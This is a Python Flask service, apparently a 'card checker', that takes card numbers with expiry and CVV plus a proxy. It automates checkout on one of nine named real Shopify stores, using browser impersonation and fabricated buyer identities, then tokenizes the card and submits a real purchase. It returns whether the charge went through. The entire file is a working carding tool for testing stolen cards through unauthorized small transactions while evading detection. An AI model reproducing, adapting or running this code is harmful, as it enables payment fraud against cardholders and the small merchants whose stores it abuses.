import os
import random
import re
import html
import string
import uuid
import time
import json
import urllib3
from urllib.parse import quote, unquote, urlparse, parse_qs
from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

STORES = [
    {"shop_url": "https://thats-what-che-said.myshopify.com", "variant_id": "32656445571154", "product_url": "https://thats-what-che-said.myshopify.com/products/coffee-before-wordle"},
    {"shop_url": "https://klubfiller.myshopify.com", "variant_id": "49321449652532", "product_url": "https://klubfiller.myshopify.com/products/klubfiller-waiting-for-tonight"},
    {"shop_url": "https://the-brush-lettering-club.myshopify.com", "variant_id": "58864569811325", "product_url": "https://the-brush-lettering-club.myshopify.com/products/love-brush-lettering-practice-sheet"},
    {"shop_url": "https://loveathomeeducation.myshopify.com", "variant_id": "49260930990270", "product_url": "https://loveathomeeducation.myshopify.com/products/ms-frizzle-earth-science-addition-8-units-pre-sale"},
    {"shop_url": "https://the-coloring-project.myshopify.com", "variant_id": "51956110360864", "product_url": "https://the-coloring-project.myshopify.com/products/beautiful-noise-inspired-single-coloring-page-i-am-i-said"},
    {"shop_url": "https://leemo-designs.myshopify.com", "variant_id": "39969683538014", "product_url": "https://leemo-designs.myshopify.com/products/digital-download-printable-daily-planner"},
    {"shop_url": "https://math-giraffe-shop.myshopify.com", "variant_id": "43428300390612", "product_url": "https://math-giraffe-shop.myshopify.com/products/inductive-vs-deductive-reasoning-doodle-notes"},
    {"shop_url": "https://swirly-shop-6926.myshopify.com", "variant_id": "53010324652341", "product_url": "https://swirly-shop-6926.myshopify.com/products/pomegranate-seed"},
    {"shop_url": "https://trebuchet-magazine.myshopify.com", "variant_id": "39682457206850", "product_url": "https://trebuchet-magazine.myshopify.com/products/trebuchet-10-materials-ii-download"},
]

BROWSER_PROFILES = [
    {"impersonate": "chrome124", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
]

def get_random_browser(): return random.choice(BROWSER_PROFILES)

FIRST_NAMES = ["Luna", "Oliver", "Milo", "Bella", "Leo", "Chloe", "Max", "Lucy", "James", "Emma"]
LAST_NAMES  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

ADDRESSES = [
    {"street": "100 SW Main St", "city": "Portland", "state": "OR", "zip": "97204"},
    {"street": "1 Granite St", "city": "Concord", "state": "NH", "zip": "03301"},
    {"street": "100 W 10th St", "city": "Wilmington", "state": "DE", "zip": "19801"},
]

def generate_identity():
    fn, ln = random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    addr = random.choice(ADDRESSES)
    return fn, ln, email, addr["street"], addr["city"], addr["state"], addr["zip"]

def random_suffix(n=12): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def parse_card(card_str):
    parts = card_str.split("|")
    if len(parts) >= 4:
        return parts[0].strip().replace(" ", ""), parts[1].strip(), ("20" + parts[2].strip() if len(parts[2].strip()) == 2 else parts[2].strip()), parts[3].strip()
    return None

def parse_proxy(proxy_str):
    for scheme in ["socks5://", "socks5h://", "http://", "https://"]:
        if proxy_str.startswith(scheme): proxy_str = proxy_str[len(scheme):]
    parts = proxy_str.split(":")
    if len(parts) == 2: return f"socks5h://{parts[0]}:{parts[1]}"
    elif len(parts) >= 4: return f"socks5h://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"socks5h://{proxy_str}"

def extract_session_token(raw_html):
    patterns = [r'name="serialized-sessionToken"\s+content="([^"]+)"', r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"', r'"sessionToken"\s*:\s*"([^"]+)"']
    for pat in patterns:
        m = re.search(pat, raw_html)
        if m:
            t = m.group(1).strip()
            if t.startswith("&quot;"): t = t[6:]
            if t.endswith("&quot;"): t = t[:-6]
            t = t.strip('"\'')
            if len(t) > 50: return t
    return None

# ==========================================
# 🛒 ROBUST PROPOSAL
# ==========================================
def run_proposal(session, shop_url, cart_token, checkout_url, build_id, session_token, queue_token, stable_id, variant_id, fn, ln, email, street, city, state, zipc, ccn_bin, amount, currency, ua):
    headers = {
        "accept": "application/json", "content-type": "application/json", "origin": shop_url, "referer": checkout_url,
        "shopify-checkout-client": "checkout-web/1.0", "shopify-checkout-source": f'id="{cart_token}", type="cn"',
        "user-agent": ua, "x-checkout-one-session-token": session_token, "x-checkout-web-build-id": build_id,
    }
    payload = {
        "variables": {
            "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token or "",
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{"selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]}, "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True}],
                "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {"merchandiseLines": [{"stableId": stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"value": {"amount": str(amount), "currencyCode": currency}}}]},
            "memberships": {"memberships": []},
            "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": "US", "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}}, "creditCardBin": ccn_bin, "allowStoreCredit": False},
            "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"}, "email": email, "emailChanged": True, "phoneCountryCode": "US", "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}], "rememberMe": False},
            "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}}}
        },
        "operationName": "Proposal",
        "id": "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8",
    }
    try:
        r = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal", headers=headers, json=payload, timeout=15)
        return r.json()
    except Exception:
        return None

# ==========================================
# 🛒 MAIN CHECKOUT
# ==========================================
def process_checkout(card_data, proxy_url, store):
    ccn, mm, yyyy, cvv = card_data
    SHOP_URL, VARIANT_ID, PRODUCT_URL = store["shop_url"], store["variant_id"], store["product_url"]

    session = requests.Session(impersonate="chrome124")
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    if proxy_url and proxy_url != "DIRECT": session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # 1. Add to Cart
        session.post(f"{SHOP_URL}/cart/add.js", headers={"content-type": "application/json", "origin": SHOP_URL}, json={"id": int(VARIANT_ID), "quantity": 1}, timeout=12)
        
        # 2. Trigger Checkout
        r = session.post(f"{SHOP_URL}/cart", headers={"content-type": "application/x-www-form-urlencoded", "origin": SHOP_URL}, data="checkout=", allow_redirects=False, timeout=12)
        redirect_url = r.headers.get("Location") if r.status_code in [301, 302, 303, 307, 308] else None
        if not redirect_url: return {"Response": "CHECKOUT_FAILED", "success": False}

        cart_token = re.search(r"/cn/([^/]+)/", redirect_url).group(1)
        real_checkout_url = f"{SHOP_URL}/checkouts/cn/{cart_token}/en-us?skip_shop_pay=true"

        # 3. Load Page & Extract Tokens
        r = session.get(real_checkout_url, headers={"user-agent": ua}, timeout=15)
        clean_text = html.unescape(r.text)

        session_token = extract_session_token(r.text) or ""
        queue_token = (re.search(r'"queueToken"\s*:\s*"([^"]+)"', clean_text) or [None, ""])[1]
        stable_id = (re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', clean_text) or [None, None])[1]
        build_id = (re.search(r'"commitSha"\s*:\s*"([0-9a-f]{40})"', clean_text) or [None, ""])[1]
        
        currency = (re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', clean_text) or [None, "USD"])[1]
        amount = (re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', clean_text) or [None, "2.50"])[1]

        if not stable_id: return {"Response": "MISSING_STABLE_ID", "success": False}

        # 4. Proposal (Get Payment Method)
        fn, ln, email, street, city, state, zipc = generate_identity()
        prop_resp = run_proposal(session, SHOP_URL, cart_token, real_checkout_url, build_id, session_token, queue_token, stable_id, VARIANT_ID, fn, ln, email, street, city, state, zipc, ccn[:8], amount, currency, ua)
        
        if not prop_resp or "data" not in prop_resp:
            return {"Response": "PROPOSAL_FAILED", "success": False}

        neg = prop_resp.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
        if neg.get("queueToken"): queue_token = neg["queueToken"]
        if neg.get("sessionToken"): session_token = neg["sessionToken"]
        
        seller = neg.get("sellerProposal", {})
        # Update amount to exact checkout total
        try: amount = seller["checkoutTotal"]["value"]["amount"]
        except: pass

        payment_method_id = None
        for line in seller.get("payment", {}).get("availablePaymentLines", []):
            if line.get("paymentMethod", {}).get("name") == "shopify_payments":
                payment_method_id = line["paymentMethod"]["paymentMethodIdentifier"]
                break

        if not payment_method_id: return {"Response": "NO_PAYMENT_METHOD", "success": False}

        # 5. Tokenize Card
        pci_payload = {"credit_card": {"number": ccn, "month": int(mm), "year": int(yyyy), "verification_value": cvv, "name": f"{fn} {ln}"}, "payment_session_scope": SHOP_URL.split("//")[1]}
        r_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json=pci_payload, timeout=15)
        session_id = r_pci.json().get("id")
        if not session_id: return {"Response": "PCI_FAILED", "success": False}

        # 6. Submit
        submit_payload = {
            "variables": {
                "input": {
                    "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{"selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]}, "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True}], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {"merchandiseLines": [{"stableId": stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}", "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"value": {"amount": str(amount), "currencyCode": currency}}}]},
                    "memberships": {"memberships": []},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": payment_method_id, "sessionId": session_id, "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": "US", "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}}, "cardSource": None}}, "amount": {"value": {"amount": str(amount), "currencyCode": currency}}}], "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": "US", "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}}, "creditCardBin": ccn[:8], "allowStoreCredit": False},
                    "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"}, "email": email, "emailChanged": True, "phoneCountryCode": "US", "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}], "rememberMe": False},
                    "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}}}
                },
                "attemptToken": f"{cart_token}-{random_suffix()}", "metafields": [], "analytics": {"requestUrl": real_checkout_url, "pageId": str(uuid.uuid4())}
            },
            "operationName": "SubmitForCompletion",
            "id": "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        }

        r_submit = session.post(f"{SHOP_URL}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion", json=submit_payload, headers={"content-type": "application/json", "origin": SHOP_URL, "x-checkout-one-session-token": session_token, "x-checkout-web-build-id": build_id}, timeout=15)
        sfc = r_submit.json().get("data", {}).get("submitForCompletion", {})
        receipt = sfc.get("receipt", {})

        if receipt.get("__typename") == "FailedReceipt":
            return {"Response": receipt.get("processingError", {}).get("code", "DECLINED"), "Price": f"{amount} {currency}", "Gate": "Shopify Payments", "success": False}
        elif receipt.get("__typename") == "ProcessedReceipt":
            return {"Response": "ORDER_PLACED", "Charged": "True", "Price": f"{amount} {currency}", "Gate": "Shopify Payments", "success": True}
        
        return {"Response": "PENDING_OR_UNKNOWN", "success": False}

    except Exception as e:
        return {"Response": f"ERROR_{str(e)[:20]}", "success": False}

# ==========================================
# 🌐 API
# ==========================================
@app.route("/")
def check_card():
    card_str = request.args.get("card")
    proxy_str = request.args.get("proxy", "")
    if not card_str: return jsonify({"Response": "MISSING_CARD", "success": False})
    card_data = parse_card(card_str)
    if not card_data: return jsonify({"Response": "INVALID_CARD", "success": False})

    store = random.choice(STORES)
    proxy_url = parse_proxy(proxy_str) if proxy_str else "DIRECT"
    return jsonify(process_checkout(card_data, proxy_url, store))

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), threaded=True)
